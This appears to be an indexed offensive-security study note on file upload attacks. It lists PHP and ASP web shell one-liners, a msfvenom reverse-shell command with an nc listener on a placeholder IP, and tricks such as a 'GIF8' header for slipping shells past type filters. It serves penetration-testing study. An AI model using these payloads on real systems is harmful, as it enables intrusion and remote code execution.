...
tags: ["File Upload", "Authentication", "Remote Code Execution", "Account Takeover", "XSS", "JavaScript", "PHP", "Deserialization", "HTTP", "XXE", "XML", "LFI"]
source: "_raw/Web attacks/Web Attacks/File Upload.md"
source_sha256: "06cc034f3a9d27f4e2197142cf7c580a8508c121eb00b92018e3092163e017e6"
curator_version: 2
...
> Family: **ssrf-xxe-file** · Severity hint: **critical** · Tags: File Upload, Authentication, Remote Code Execution, Account Takeover, XSS, JavaScript, PHP, Deserialization, HTTP, XXE, XML, LFI
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `php: <?php system($_REQUEST['cmd']); ?>`
- `<% eval request('cmd') %>`
- `php: $ip = 'OUR_IP';     // CHANGE THIS`
- `bash: $ nc -lvnp OUR_PORT`
- `bash: $ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
- `bash: $ nc -lvnp OUR_PORT`
- `html: <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".j`
- `jsx: function checkFile(File) {`
- `checkFile`
- `18`
- `html: <img src="/profile_images/shell.php" class="profile-image" id="profile-image">`
- `php: $fileName = basename($_FILES["uploadFile"]["name"]);`
- `php: $fileName = basename($_FILES["uploadFile"]["name"]);`
- `php: if (!preg_match('/^.*\\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }`
- `xml: <FilesMatch ".+\\.ph(ar|p|tml)">`
- `bash: for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '…' ':'; do`
- `php: $type = $_FILES['uploadFile']['type'];`
- `bash: $ wget <https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web`
- `bash: $ echo "this is a text file" > text.jpg`
- `bash: $ echo "GIF8" > text.jpg`
- `php: $type = mime_content_type($_FILES['uploadFile']['tmp_name']);`
- `Only images are allowed`
- `GIF8`
- `.php`
- `bash: for link in $(cat wordlist.txt); do`
...
- Bypassing Filters
    - Client Side Validation
        ...
        **Note:** We may also modify the `Content-Type` of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.
        ...
        To do so, we can go back to our inspector, click on the profile image again, double-click on the function name (
    ...
    - Type Filters
        ...
        **Tip:** Many other image types have non-printable bytes for their file signatures, while a `GIF` image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string `GIF8` is common between both GIF signatures, it is usually enough to imitate a GIF image.
        ...
        Once we forward our request, we notice that we get the error message
        ...
        before our PHP code to try to imitate a GIF image while keeping our file extension as
...
## Source
Original note: `_raw/Web attacks/Web Attacks/File Upload.md`
